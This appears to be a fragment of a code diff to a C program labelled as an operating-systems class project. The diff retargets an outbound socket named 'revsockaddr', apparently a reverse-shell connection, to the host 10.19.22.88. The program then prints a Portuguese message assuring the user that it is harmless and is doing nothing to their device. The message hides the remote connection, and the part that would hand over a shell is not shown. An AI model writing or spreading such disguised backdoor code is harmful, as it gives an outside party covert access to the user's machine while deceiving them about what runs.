@@ -21,7 +21,7 @@ int main() {
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
         revsockaddr.sin_family = AF_INET;       
         revsockaddr.sin_port = htons(port);
-        revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+        revsockaddr.sin_addr.s_addr = inet_addr("10.19.22.88");
 
         connect(sockt, (struct sockaddr *) &revsockaddr, 
         sizeof(revsockaddr));
@@ -38,6 +38,5 @@ int main() {
         printf("Ola! eu sou o projeto de Sistemas Operacionais com PID = %d\nNao se preocupe, eu sou inofensivo e nao estou fazendo nada com seu dispositivo :)", getpid());
     }
 
-    
     return 0;
 }
